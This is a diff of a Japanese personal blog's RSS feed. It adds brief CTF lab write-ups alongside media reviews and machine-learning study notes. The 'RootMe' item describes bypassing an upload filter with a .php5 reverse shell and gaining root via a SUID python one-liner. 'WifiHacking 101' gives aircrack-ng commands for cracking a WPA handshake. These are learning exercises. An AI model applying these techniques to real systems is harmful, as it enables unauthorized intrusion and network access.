+      <pubDate>Tue, 20 Feb 2024 02:16:10 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/rootme/</guid>
+      <description>植峰ノルジュ，最近マジでアツい
+マイクラ配信がおもしろすぎる
+enum nmap 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) gobuster /panel：ファイルアップロード用 /uploads：アップロードが見える user.txt リバースシェルをアップロードすればいい .php のフィルタがかかっているので .php5 とかにでもしてアップロード root.txt linpeas.sh で /usr/bin/python がヒットしたので GTFObin でみる python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)’ おしまい </description>
+    </item>
+    
+    <item>
+      <title>WifiHacking 101</title>
+      <link>http://side-realms.github.io/writeup/wifihacking/</link>
+      <pubDate>Tue, 20 Feb 2024 02:06:20 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/wifihacking/</guid>
+      <description>BOØWY，空前の大ブーム
+aircrack-ng 4way-handshakeをキャプチャした pcap が得られるので，これをクラックすればいい Aircrack-ng ~~.cap -w ~~.txt で総当たりができるらしいが遅いので，HCAAPX ファイルに変換する方法が使えるらしい aircrack-ng -j wifi ~~.cap aircrack-ng -a2 -b BSSID -w ~~.txt ~~.hccapx え，終わった．．． 手元の環境でもやりたい</description>
+    </item>
+    
+    <item>
+      <title>Agent Sudo</title>
+      <link>http://side-realms.github.io/writeup/sudoagent/</link>
+      <pubDate>Sat, 17 Feb 2024 20:49:48 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/sudoagent/</guid>
+      <description>そういえばLerningしかやってなくてマシンを解いてないことに気付いたのでせっかくなら writeup を書きつつやっていく
+enum nmap PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) gobuster /.hta (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /index.php (Status: 200) [Size: 218] /server-status (Status: 403) [Size: 278] user.</description>
+    </item>
+    
+    <item>
+      <title>見たものログ 2024</title>
+      <link>http://side-realms.github.io/log/log_2024/</link>
+      <pubDate>Mon, 01 Jan 2024 17:57:25 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/log/log_2024/</guid>
+      <description>漫画 三つ目がとおる よくある文明風刺 古代遺跡が頻出するのでオープンワールドを探索している気分になる 縄文遺跡を発掘する話が好き ポジティブ先生 ここまで読むとパターン見えてきたよ！って気持ちになる 悪の組織シリーズ好きだから単行本にしてほしい バンパイヤ 「間久部」だし魔女が成功を予言するシーンもあるから多分マクベスだろう 手塚治虫本人が出ていて且つストーリーに深くかかわっているのは意外 ヒゲオヤジが武闘派なのも意外 第一部しか読んでない．第二部は雑誌の都合で打ち切りになってしまったらしい 人間なのにかなり邪悪な思想をもつ間久部とバンパイヤなのにかなり善良な（差別気味ですが）トッペイの対比を描きたかったんだろうと思う マグマ大使 人間モドキをめぐる人間の葛藤が面白かった 人間モドキが人間モドキバレするのに加えて人間が人間モドキと疑われて襲われるシーン 人間モドキが人間と絆を繋げてしまうシーン ゴア弱すぎない？ 最後の方のやっつけ感が残念だけどこの時期はかなりオーバーワーク気味だったらしい 海のトリトン ポセイドン貯蔵庫みたいなのマジでキモすぎて笑った ピピ子かわいすぎる，新しい扉が開くところだった ガノモスと自爆エンドですべてを台無しにしている ザ・クレーター マジでおもしろい．この時期に「手塚は終わった」って言われてたらしいけどこの時代にこのレベルの作品を描けた人何人いるんですか？？ 風穴 ？？？ 鈴が鳴った 音と記憶がトラウマとして結びついた結果．．．みたいな ラストの皮肉っぽい感じ，咀嚼しきれない クレーターの男 戦争アカンな（薄） 数百年も地球への帰還を求めていたのに地球の惨状を知って月での暮らしの方を選んでしまう 核の光怖すぎ 煙で永遠に生きられるけど正気でいられるのか，みたいな怖さと死ぬときはほぼ自殺になってしまう怖さがある 全部面白いけど書ききれない 七色いんこ かなりおもしろい ほとんど短編集の体をしていて娯楽作品だが大筋のストーリーが相当いい 絵もいい．いんこがただ冷静なキャラに収まっていないのが余裕を感じる いんこの正体，女刑事との関係，みたいなのは手塚治虫もこういうの描くのか．．．みたいな気持ちになる 「日本の国土！！」が思想強すぎて笑った アポロの歌 女神像のシーンがうますぎる．劇画とはこのこと 近石昭吾の転生は，毎回愛を知った瞬間にどちらかが死ぬことで幕を閉じる 最後の描写的に一生転生するからかなり怖い かなり最後の方にアポロが出てくるが，ここまで考えているなら本当に怖い 合成人間の話がかなりつらい 合成人間と区別するための，人間としての尊厳を考えたときに愛情が必要だと手塚治虫は描いている 一方で合成人間である女王は途中から愛情を覚えている（ように見える） そうするとこの世界で区分される人間と合成人間の違いは組成的な違いしかないように見える 昭吾の暗殺仲間は愛情を知らない（ないがしろにする）人間の表現なのかな？ きりひと讃歌と同時に連載していたらしい．異常 人間ども集まれ 絵柄がこれまでとは全然違って力が抜けている これが悪いわけではなくてむしろテーマに寄り添っていて好みではある ただ手塚治虫に求める（何様）絵柄はこれではないという感じ こういう作品を見るたびに思うけど話の広げ方がうまい時期とめちゃくちゃな時期がある エロ要素がふんだんに盛り込まれているんだけどどれもが迫真すぎてエロくない 性癖目的のエロと迫真のエロが切り分かれてる気がする．考えすぎかも というかこの絵柄だから耐えてるだけで普通にどろろとかの絵柄でやったら事故ると思う 第三の性が今でいうLGBTQみたいな話かどうかは分からない 戦争はダメなのはそれはそうなんだが第三の性を使って戦争をエンタメにするのがよくないという倫理観と闘牛は許せる，みたいな倫理観の境界どこにあるのか エンタメとしての戦争（最悪）とか，第三の性みたいなのを目で見たことないから（それはそうなんだが）よく分からない 人間の体をしていたら倫理観が発動するのか，じゃあハンディキャップとか犯罪者はどうなるんだ，みたいな 犯罪者とハンディキャップを同じくくりとしてみているわけではない 反逆系は手塚治虫のパターン（メトロポリスとかバンパイヤとか）だけどこの作品は反逆側も人間なだけに重い かなりデフォルメが効いててそれが逆にしんどい（銃殺がただの穴あきで表現されるとか） メトロポリス 旧版をよんだので読みずらかった よくある反逆系 子供向けだからか結末付近が「こういうのでいいんだよ」って感じでよかった．こういうのでいいんだよ ミッドナイト すばらしいと思う，手塚治虫の短編能力はマジで目を見張るものがある しかもただの短編というわけではなく，七色いんこのように大筋のストーリがあってその中で短編，たまに中編が混じるという感じ 珍しく小さい女の子が頻出する．かわいい ここまで単純な正義を貫いた作品も珍しいと思いつつ，ホラー，SF，人情などただの勧善懲悪で終わらせない創作能力の高さも同時に感じる カササギ運輸・クリプトムネジア・花火師の話が好き 特に花火師は良い 対決で終わりかと思ったらその奥にもう一つエンドがある ブラックジャックとか三つ目とかがクロスオーバー的に出てきて胸アツ ラストが衝撃すぎたが性別をテーマにする手塚治虫らしいといえばらしいか．．． 「どんでん返し」はこれくらいやってから言ってほしい ばるぼら 相当おもしろかった 芸術と人間関係，みたいな話 このころの手塚は相当落ち込んでいたらしく，アニメも上手くいかず，会社も倒産，少年誌もバズらず，みたいな感じだったらしい 前半は短編形式で若干のコメディを交えながら話が進むが，後半からばるぼらの正体は何か，みたいなところに迫っていく 手塚治虫の根底には「マンガを大人の文化（芸術）にする」みたいな意思があったはずで，その影響なのか後半は芸術観に迫った話が多いように思う ばるぼらが魔女である，みたいなところまでは良くて，一方で魔女と芸術がどういう関係にあるかはまだ理解できない 宗教的観念なのか？ 最後はほぼ神vs人間みたいな構図になっている 死の淵で創作した作品は理性を保つためなのか，それとも単純に心身を削って完成した賜物なのか 名声に対する意識も気になる 美倉は最後の作品がバズっても世間に姿を現さず，「死んだ」という体で浮浪している これまでの美倉（特に結婚後）は名声に意識があった 手塚治虫自身に対する戒め的な表現なのか？とか思ったがよく分からない ファウスト ファウストと百物語が入っているがどっちもファウスト準拠 百物語の方がさすがに洗練されていて面白い ファウストは古典をそのままなぞっただけ感があるが，百物語はちゃんと自分の物語になっている 名前のモジり スダマさすがに可愛すぎる マジでケモナーになってしまった メタモルフォーゼも同時に発症してしまって救いようがない このころスランプの時期だったらしい． サスピション あまり面白くなかった というか結末が思ったより単純 ハードルが高すぎる感は否めない こじき姫さすがに性癖出すぎ 後期の作品だけあって絵柄は綺麗 ガラス城の記録 かなり面白かった 終わり方が．．．あんまりにも．．． 来るべき世界 安直な文明漫画といえばそうかも 世界が滅亡することが一番の平和というのはそうかもなあという気持ちになる 火星博士 この時期のアクションは可愛げがあっておもしろい 大空魔王 拳銃天使 最後のコマですべてひっくり返ってて笑った 仮面の冒険児 上を下へのジレッタ VR を先取りした漫画だと思う．さすがに先見の明すぎる 最後世界の終焉を迎えるのは特に意味がないと思っている ジレッタが出てくるのが意外と遅いが，これは逆説的に書き始めの時点からプロットがしっかり引かれていることの証拠だと思う． ヒロインの変身具合がすごい 実写でやったら多分冷めるだろうな，ぐらいの勢い 多分映画とかアニメに対するライバル心・熱意があって漫画表現の最上を狙ったんだと思うが考えすぎかもしれない 38 度線の怪物 火星から来た男 化石人間 38 度線は朝鮮のことかと思ったけどそうではないんだな SF ミックス 短編集が入っている ランダムに入っていて，SF ミックスという名前で出版をしているわけではない？ 時計仕掛けのりんご 全部の短編がクオリティ高くて面白い ペーターキュルテンの記録 連続殺人犯のノンフィクション ふるまいは完全にサイコパスなんだが途中途中に挟まる人間への愛情が変なコントラストになっていて怖い 時計仕掛けのりんご いい SF でもこれ仮に市内でうまくいっても全国に拡散するのは難しいんじゃないか カノン 戦争系の描写つらすぎる 仮に小さいころ失くした友達に会えるってなっても余計に悲しくなるから会いたくないよな 白い幻影 これ手塚治虫の短編の中で一番好き 妻側の誠意と不憫さが後味最悪 でも夫側も記憶喪失なだけで誠意が無いわけではない 妻側がもう後戻りできない年齢になっているのも悲しい 最上殿始末 間男が実は元殿だった説を推す MW すさまじい Man, Women という意味で MW らしい 雰囲気はアドルフに告ぐに似ているが，こっちの方がフィクションっぽい 政治悪，同性愛，異常性癖，猟奇殺人みたいなありとあらゆる闇がてんこもり 一方でそれぞれが十分な情報量をもっていないので中途半端ともとれてしまう 警察と神父のやりとりは面白かった．実際に懺悔はどう扱われるんだろう 後味の悪さ，というか勇気ある行動も報われず悪が買ってしまう結末は CUE とか SEVEN に似てる 映画もあるらしいけどキャッチコピーが終わってて悲しい 結城の性癖どうなってんや 賀来の葛藤が醍醐味だと思う．神父という立場でありながら同性愛，かつ犯罪を見過ごす立場にいることの矛盾，みたいな 同性愛のスクープの解決方法はおもしろかった 火の鳥 小さいころ読んだけど覚えてないし改めて読んで感想を残そうという試み 黎明編 ラストのコママジで良い モノクロなのにここまで広い世界描けるのすげ～ 未来編 クライマックスすぎる 世界絶滅後の景色の移り変わりの描き方が映画かと思った 2001年宇宙の旅を感じる マサトが絶対的な存在になった後の展開は目を見張るものがある 単純に人間になるだけでなくナメクジ人間みたいなのが登場することで，今自分たちが知ってる古生物以前にもっと深い歴史があったように思える 序盤の戦争勃発みたいな話をこの時代に想像できていたのマジで手塚治虫すぎる 大和編 殉死の尊さと命の尊さが逆転したのってどれくらいの時期なんだろう 宇宙編 流刑星の救われなさがヤバい こういう強烈な環境と「なれの果て」みたいなのを描くのうますぎるな 火の鳥はフレミルの民族ってことなのか？ でも牧村がフレミルを虐殺しているときにフレミルはちゃんと死んでいるから永遠の命をもっているのはコンタクトをとってきたフレミルだけなんだよな 一方でフレミルが以前人間の姿で登場したときはこの容姿だったように思える 顔が醜くなったのは黎明編の猿田彦に似てるな 鳳凰編 復活編・羽衣編 望郷編 乱世編 本 内田百閒 ちくま日本文学 冥途・道連れ・山高帽子がよかった 本筋とは関係ない描写が多くて飽きない 幻想的，って言われる意味が分かった 鈴木翁二みたいな雰囲気を感じる 尾崎翠 ちくま日本文学 正直何がいいのか分からない 結構読むのが苦痛だった 結局何が言いたいのか，何の話をしているのか，何を言っているのか 雰囲気を楽しむ小説だ！ってことで解決してる 詳しい人解説してください．．． 青山美智子 赤と青とエスキース 文章が丁寧だし展開も丁寧だから伏線を忘れずに読むことができたんだけど丁寧すぎて逆に先が完全に予測できてしまった 市川哲也 あの魔女を殺せ 常に予想の一歩先をいかれる感じがあって悔しかった 登場人物が少し理性的すぎる？ ミステリに架空の設定が加わることによる話の広がり方が思ったよりもよかった 映画 わが青春に悔いなし 戦時中，大学のアイドルである原節子は藤田進に好意を持っている 思想統制が行われている中，藤田進は反戦を貫き，河野秋武は変節して検事になる 原節子は実家がかなり太いため，藤田のような生き方に憧れており，大学卒業後も藤田進の研究所に行ってなんだかんだ結婚する その後藤田はスパイ容疑で逮捕され，獄死．原節子はその後藤田進の実家に行き，農業を手伝う． もちろん村八分されていて，せっかく育てた田を荒らされたりしたがめげずに農業を継続し，最終的に終戦，藤田進の行動は受け入れられて原節子も村に迎えられておわり 自分の意思を貫き続けた藤田進と変節してしまった河野秋武が対比されているが意外と凡庸な表現をするんだと思った 原節子がマジでかわいい 原節子の「厳しい生き方に憧れる」気持ちはまあわかる．「貧乏な方が偉い」とか「実家が細い方が偉い」みたいな考え方をする人間はたまにいるから理解はできるけど高校生くらいで卒業するべきだよな．．． 「自由ってなんですか」みたいな問いかけがあるわけではなく，結局「正義は勝つ」みたいなシナリオ ただメッセージがあるわけではなくプロパガンダ的な映画なのでそういうことなんだろうと思うます 或る夜の出来事 令嬢腹立つ 編集長と令嬢の父親意外といいやつなんだな ジョンウィック 車を盗まれて飼い犬も殺された元最強の殺し屋が復習する話 ただただキアヌ・リーブスのアクションが楽しめる ラスト犬盗んだ？？って思ったけど盗んだ(ように見える)のは殺処分予定の犬らしい 殺し屋ってソナチネのイメージがあるからもっとどうしようもない恰好してるんじゃないか，っていつも思ってしまう 蜘蛛巣城 マクベスを主題にしているらしい 三船敏郎の顔 音質がバグ ﾋﾟﾛﾋﾟﾛﾋﾟﾛみたいな笛の音がとてもいい，というか能をブレンドしたシーンが全体的にいい 老婆とその住処が消えるシーンは驚いた，これこの時代にしては強い技術なんじゃないか ラストシーンでめちゃめちゃ矢を打たれることを三船敏郎は詳しく聞かされていなかったらしい だからあんなに迫真なんだな トレインスポッティング 荒れたい時期よく分かる あの中ではレントンは素行が良い方のように見えるが結局いいところばっか持って行くタチの悪いワル（意識的ではないだろうけど）だったなという印象 悪いことから足を洗うにはあれくらい荒くする必要があるのかもしれない レザボア・ドッグス 潜入刑事がかっこよかった 最後の描写が少し微妙 獄門島(石坂浩二) だんだん横溝正史のパターンが分かってきた(にわか) ドラマ・映像 怪奇大作戦 科学と聞いていたので最初は真剣に見ていたが2話くらいから一歩引いて見るようになった なんだよスペクトルG線って 小林昭二なんでも出てるな 実相寺昭雄の回が画がきれいでいい 恐怖の電話 死神の子守歌 24年目の復讐 京都買います 本陣殺人事件(古谷一行) こういう雰囲気の家系大好き 動機がしょうもなすぎる気がするけどこの時代特有なのかしらね 犬神家の一族(古谷一行) 雰囲気最高 ギミックがいくつもあってかなり面白かったし推理してても楽しかった ゲーム Haiku, the robot ソウルライクというよりは hollow night 操作も楽でボスも簡単 時限イベントが少ないのでトロコンがやりやすい 最難関は回復なしクリアだけどボス戦で回復する暇がほとんどないのでこれはクリアできそうな気もする system purge 死にゲーを地で行くようなゲーム アクションは単純で残基無限，復帰も早いのでサクサク進んでしまう ギミックはシンプルなものが多い一方で組み合わせ方が面白いものが多い ストーリーがかなり独特でいい．こういうの大好き ゲーム自体は全然簡単なんだがおそらくスピードランは全く太刀打ちできないと思う その他 桂歌丸</description>
+    </item>
+    
+    <item>
+      <title>見たものログ 2024</title>
+      <link>http://side-realms.github.io/log_2024/</link>
+      <pubDate>Mon, 01 Jan 2024 17:57:25 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/log_2024/</guid>
+      <description>aaa</description>
+    </item>
+    
+    <item>
+      <title>音楽生成2</title>
+      <link>http://side-realms.github.io/sound/ml3/</link>
+      <pubDate>Sun, 03 Dec 2023 13:41:49 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/sound/ml3/</guid>
+      <description>名誉伝説のドラム上手くないですか？
+導入 前回の音楽生成の続き
+この本の目次を読んで自分で実装してみる
+オートエンコーダによるメロディ圧縮 多分オートエンコーダを使った次元圧縮のことを言っているんだと思う． メロディ圧縮は調べてもよく分からんので(多分メロディ情報の圧縮のことだと思うが)単純にオートエンコーダをいじってみる
+とりあえずここを見てみる
+オートエンコーダは，入力と出力が同一になるように学習することで 入力の次元圧縮器を生成する NN の一つ． 中間層が入力層よりも次元が小さくなっている．
+次元圧縮：直感的な使い方で，入力したデータをデコーダで再現できるレベルで中間層に圧縮することで次元を削減できる 異常検知：正常な入力だけで NN を学習すれば，異常な入力をしたときに出力側で再現できなくなるので，異常検知に使うことができる． 実装 チュートリアルをなぞるだけだけどやってみる
+import matplotlib.pyplot as plt import numpy as np import pandas as pd import tensorflow as tf from sklearn.metrics import accuracy_score, precision_score, recall_score from sklearn.model_selection import train_test_split from tensorflow.keras import layers, losses from tensorflow.keras.datasets import fashion_mnist from tensorflow.keras.models import Model (x_train, _), (x_test, _) = fashion_mnist.load_data() x_train = x_train.astype(&amp;#39;float32&amp;#39;) / 255. x_test = x_test.</description>
+    </item>
+    
+    <item>
+      <title>音楽生成</title>
+      <link>http://side-realms.github.io/sound/ml2/</link>
+      <pubDate>Sat, 02 Dec 2023 17:57:25 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/sound/ml2/</guid>
+      <description>中華ホラーにハマってる
+たまにシャレにならない怖さのものがあって興奮する
+導入 いい本があった
+おもしろそうなので目次だけ見てコンテンツを自分で実装してみる．
+機械学習入門 まずは概観する． ここは先の書籍とは関係ない．
+単純パーセプトロン $y=f(wx+b)$ があって，$w$ が重み，$x$ が入力，$b$ がしきい値
+入力 $x$ が複数次元存在し，これが重み $w$ を持って加算される． この結果 $y$ がしきい値を超えれば発火するし，超えなければ発火しない．
+$f$ の活性化関数は，例えばステップ関数なら 0, 1 を出力する． でも二値しかなくて不便なのでロジスティック関数を使うこともある． 0, 1 の二値ではなくて，0, 1 の確率を出力する． 確率が 0.5 を超えれば 1 みたいなイメージ
+で，これは結果出力の話で，機械学習というからには学習をする必要がある． 例えば一回目で $y_1 = f(wx+b)$ という結果が得られたとする． このとき正しい答えは $t$ であるとする． 出力が大きいときは，入力に対して小さくなるように重みを訂正する必要があるので，例えば以下のようにする $$w&amp;rsquo; = w - (y-t)x$$ 例えば出力が大きいときは $y-t &amp;gt; 0$ となるので， $w-(y-t) &amp;lt; w$ であるから， $w&amp;rsquo;$ は小さくなる． 逆に出力が小さいときは $y-t &amp;lt; 0$ となるので， $w-(y-t) &amp;gt; w$ であるから， $w&amp;rsquo;$ は大きくなる． バイアス $b$ も同じように調整される．</description>
+    </item>
+    
     <item>
       <title>古生物1</title>
       <link>http://side-realms.github.io/archeology/palaeontology1/</link>
@@ -451,12 +782,19 @@ delayed auditory feedback：自信の声にディレイをかけてフィード�
     </item>
     
     <item>
-      <title>見たものログ</title>
-      <link>http://side-realms.github.io/log/</link>
+      <title>見たものログ 2023</title>
+      <link>http://side-realms.github.io/log/log/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/log/</guid>
-      <description>2023 (06~) 漫画・本 ジョジョの奇妙な冒険：一部 岸部露伴は動かない ブルーピリオド 呪術廻戦 禪院真希かっこよすぎる．覚醒前も後も好き ブルーロック 絵，うますぎない？ 千切豹馬すき チェンソーマン 落下の悪魔のデザイン良すぎる 東京卍リベンジャーズ 三ツ谷と場地がかっこよすぎる ルリドラゴン 絵もかわいいしシナリオもローカルなファンタジーって感じがしてすごく好き 休載つらい&amp;hellip; 安静にしてください&amp;hellip; 光が死んだ夏 神系のホラーはよくあるけど切り口が新しくてとてもいい あかね噺 朱音かわいいね．．． 落語見てみようかな サンダー3 GANTZだと聞いていたけど思ってたよりGANTZだった 二頭身シーンの絵がすごいかわいい 壮大な話だと展開が遅く感じてしまうな 亜人 戦闘シーンかっこよすぎる 「死なない」だけだと直接の強さにならないけど使う人が使うとこんな使い方があるんだと思う 刷ったもんだ！ 印刷業全く知らなかったから勉強にもなる ムルシエラゴ いや，下心はないんで 黄泉のツガイ 荒川弘の新作，アツすぎる キャラクターが多いのにちゃんと覚えられるのはキャラが立ってるからだろうと思う リバイアサン 劇画が話と合ってていい 裏バイト 死体清掃の回が一番怖い 不死身のパイセン ホラーコメディかと思ったら油断した アフターゴッド つらい 絵がうますぎる，部屋とか建物の絵が異常にうまい 「綺麗な顔」を描くのもうまい これまで言葉でしか語られなかった心情を悲劇の過程で具体的に絵で描く，みたいな，最悪の事態の結果，誰かからの愛を知ることになる，みたいな，そういうどうしようもない感情を描くのがうまい 僕の部屋のユウ子さん 泣いちまったよ この世は戦う価値がある はぐれ人魚のディアナ 江口さんはゲーム脳 雷雷雷 あくたの死に際 怪異と乙女と神隠し 一勝千金 ヴァンピアーズ 合コンに行ったら女がいなかった件 一昔前の二次創作みたいな絵柄でめちゃめちゃ好き pixiv 漁ってた頃を思い出す ウェルベルム よくある殺し合い漫画だけど殺しに重きを置いてないのがいい 絵もいい 鉄コン筋クリート ネズミ，かっこいいよ クロのつらさとかシロの強さが絵柄にあってると思う ピンポン ペコかっこいい 多分星野が主人公だと思う．そうであってほしい それでも町は廻っている 7億周くらい読んでる 時系列シャッフルすごくおもしろいからどこかで一回まとめたいな 歩鳥がただの天然じゃなくて意外としっかりしてるところがあってキャラ倒れしてないのが本当に好き 真田との関係も多くは語らないし，多分歩鳥自身もまだ日常が続いてほしいと思っているんじゃないかと思う(にしんそばの話にもあったような感じ) 小ネタの数とか細かい伏線が回収されていて，どこまで想定して描いてるのか分からなくて怖くなる たけるとエビちゃんの話ももっと読みたかった 不安の種 初代はマジで怖かったけどアスタリスクの方はオムニバスっぽくてあまり怖くない タコピーの原罪 胸糞エンドじゃなくてほんとうによかった ROPPEN 話がただ殺し合うだけじゃなくて面白い 政治を黒幕に出すんじゃなくて初めから出てくるのは印象がいい 極楽街 絵がうますぎる ダラとネイがかわいい 個人的に一番アツい パラレルリープシンドローム 絵がかわいい ただのタイムリープ系かとおもったらもう一つひねってていい 変な家 間取りの理由が一巻だけで終わりならイマイチだったけど予想以上に広がってておもしろい おやすみプンプン これを鬱漫画だと褒めたたえる人間と仲良くなれない プンプンの半生を南条視点で描いている プンプン視点の話はおそらくラスト3話だけ プンプン自身が声を発しているのも愛子ちゃんとの回想シーンだけ 死にたがっているプンプンが南条に飼い殺されるエンドなのでプンプンにとってはバッドエンドだと思う 愛子ちゃんはずっと「運命」「信仰」みたいなものを意識していて，多かれ少なかれ母が信仰する異常な宗教の影響はあったんだろうと思う 愛子ちゃんが自殺する直前は多分彼女にとって一番幸せな瞬間で（運命の人と両想いになれている，っていう話から），その瞬間を残しておきたかったからなのか，それともプンプンの記憶に一生残り続けたいからなのかはよく分からないけど結局死んでしまった 最終巻，七夕の日にプンプンが愛子ちゃんの夢を見るシーンは本当につらかった 殺人を共有して，最終的に目の前で自殺されてしまってもプンプンは愛子ちゃんのことを忘れていってしまうっていうのが救われない（覚えていたらそれはそれで） 最後まで現実と戦ってた南条の勝ち（表現が正しいかはわからないけど）なんだろうと思う 愛子ちゃんと南条の印象が大きすぎるけどプンプンママ好きだった 暗殺教室 久しぶりに読んだ アニメの方がよかった 鋼の錬金術師 久しぶりに読んだ 絵がうまい ロイアイって無いんですか&amp;hellip;そうですか&amp;hellip; BANANA FISH 寝込んだ 最後のがやりたかっただけだろ！って思いながら寝込んだ 奇子 閉鎖的な，ムラ的な雰囲気が感じられていい 奇子が異常にエロくて手塚治虫のキモさを感じた．エロいというよりグロいかもしれない 近親相姦の背景があるからだと思う 奇子周りが全滅するか否かが単行本と連載版の違いらしい 敗戦国である日本に漂う角張ったプライドと閉鎖感と人間の業の深さ，それに対抗する人間の力強さ（？）みたいなものが色んな人を通して描かれている． 奇子は自らの意思で運命に抗っているようには思わないけど，結果的にそうなっているように見える 下山事件を踏まえつつ，一族の複雑な関係を描いていて怖い 続きがあるのか，もう少し長く描いてほしかった どろろ どろろかわいいね もう今更妖怪の造詣に感動することはないが，この時代のクオリティにしては高すぎるとは思う 最初に地獄堂で祈る場面は異常に絵がうまくて感動した 夢幻紳士 絵がかわいい こんなに仰々しい絵をしているのに話の気が抜けてていい ソラニン 女の子はかわいい バンドの道を進むことを信号無視と対比してその結果失敗する，っていう表現はいいけど自分で解説しちゃうのが寒い うみべの女の子 女の子はかわいい 大瀧詠一の 1st 聴いてる女子高生良すぎるだろ 最後にフラれた小梅の表情好き ネムルバカ マジでよかった 変な余韻を残したり深いような表現をしないで，ただ一般の日常が流れるように鯨井が消息を絶つのがすごく切ない 虹ヶ原ホログラフ すごくよかった，浅野いにおは中身のない漫画よりこういう SF を描いてほしい(身勝手) 妖怪の「件」を中心に据えた構成 タイムラインがごちゃまぜになってて考察の余地が広い ブリキ缶はなんだ？ 件の持つ能力をブリキ缶に対応させているとするなら，鈴木は予言の力をもたないことになる 鈴木の本名(天彦)は天人の意味をもつから，鈴木は件としての力ももち，天人としての力ももつことになる． 「強い意志をもちなさい」というセリフは件の力を持ちながら行使するな，ということだと思う 1999 素晴らしき日々 ひかりのまち 零落 世界の終わりと夜明け前 デッドデッドデーモンズデデデデデストラクション すごくよかった ラストの「時空が歪んじゃうよ！」っていうのは，戦争中の世界からの凰蘭と門出がタイムマシンを使ってタイムリープ後の世界に来たから発言しているのだと思う（リープ後の門出たちと戦争中の門出たちが鉢合わせてはいけない）．リープ後の凰蘭は「はにゃにゃふわ～～」なんて言ってないし なので戦争中の凰蘭と門出は生きているんじゃないだろうか タイムリープの話が出たときはテンション上がった．これくらい壊してくれていい どうせなら戦争中の世界で話を終わらせてほしかったがまあ難しいんだろうな．．． うずまき 最高 ドラゴンヘッド かなり怖いけど大好き ずっと酸素が薄い感じがする 火災旋風のあたりから本当に怖くなった 海辺へ行く道 純文学みたいな感じがする 白黒なのに空とか海が青いように見える 密度が濃いというか一週間に一冊くらいがちょうどいい 透明通信 きれいなつげ義春 夜空が銀河鉄道の夜みたいな雰囲気を感じる マッチ一本がよかった ウツロボロス エグい 丸尾末広の系譜なんだろうがただの性癖さらしになっててキツいと思ってしまう Present for me ヒーローの話が好き よつばと！ 季節の表現が上手ですき つげ義春全集 ねじ式 ★ ゲンセンカン主人 夢の散歩 アルバイト 雨の中の慾情 夜が掴む コマツ岬の生活 外のふくらみ 必殺するめ固め ヨシボーの犯罪 ★ 窓の手 夏の思いで ★ 懐かしいひと ★ 事件 ★ 退屈な部屋 ★ 日の戯れ ★ 外天楼 きちい 阿呆にも歴史がありますの 空気の底 処刑は3時に終わった ジョーを訪ねた男 夜の声 野郎と断崖 グランド・メサの決闘 うろこが崎 暗い窓の女 ★ そこに穴があった ★ わが谷は未知なりき 猫の血 ★ 電話 カメレオン 聖女懐妊 ★ カタストロフ・イン・ザ・ダーク ロバンナよ ふたりは空気の底に ★ 人間昆虫記 十村十枝子は本名がウスバカゲロウからきているらしい(臼場かげり)．アリジゴクってことですね． 十村が芥川賞を受賞したシーンから始まるが，物語が進むにつれて十村は様々な人の作品を模倣して活動していることが分かっていく．作家として，演出家として名を上げた十村の作品は模倣（なんならそのままパクリ）によって成立していることが分かる． 模倣された側の人間は様々な方法で破滅していく 十村はずっと「満たされない」みたいなことを主張して，蝋人形の母親にすがっているが，これは模倣ばかりで中身がない活動ばかりしているから，という単純な理由だと思う 世間から見れば十村の作品が模倣だろうがオリジナルだろうが関係ない，という二面性も作品の芯だと思う ユニコ ユニコまじでかわいい 家族と会う話が一番好き コーンが可愛すぎる あの終わり方切なすぎるだろが アドルフに告ぐ リボンの騎士 リボンの騎士 野ばらの精 虹のプレリュード ジャングル大帝 本 豊井裕太 水と手と目 大阪圭吉 とむらい機関車 デパートの絞刑吏 灯台鬼 花束の虫 香水紳士 銀座幽霊 動かぬ鯨群 あやつり裁判 寒の夜晴れ 石塀幽霊 死の快走船 小酒井 不木 恋愛曲線 岡本かの子 鮨 坂口安吾 白痴 桜の森の満開の下 エドガーアランポー アッシャー家の崩壊 黒猫 早すぎる埋葬 ウィリアム・ウィルスン 岡本綺堂 青蛙堂鬼談 三島由紀夫 レター教室 映画 戦場のメリークリスマス キスされたときの坂本龍一の演技が迫真すぎて笑ってしまった 鬼気迫ってるわけでもないが平和と命の危機がうっすら共存している雰囲気がとても怖い 特に何もなくてもストレスがかかる ほんとうにつらい 最強のふたり もう少し大人になったら分かるんだろうか 8 1/2 名画らしいので見たが，過去・未来・妄想・夢が入り混じったつくりになっていて理解できない部分が多かった カトリックの話がよくでてきていて，主人公自身もカトリックにいい思い出はなさそうだったが，それが話にどう関わっているかはわからない 妻との仲もよくなく，それもそのはずで，妻との旅行でも全く抱こうとせずに映画監督は出演希望の女性ばかりに目を向けている 映画の撮影が始まらない中で，プロデューサーたちは主人公を催促するためにセットを作ったりカメラテストをしたり，撮影直前の記者会見を開いたりと，取り返しのつかない状況を作る 主人公は当然何も話せず机の下にもぐってしまい，最終的にはポケットの中の拳銃で自殺する．．．という妄想をする．当然生きているが映画監督としてのキャリアはもう死んでしまった 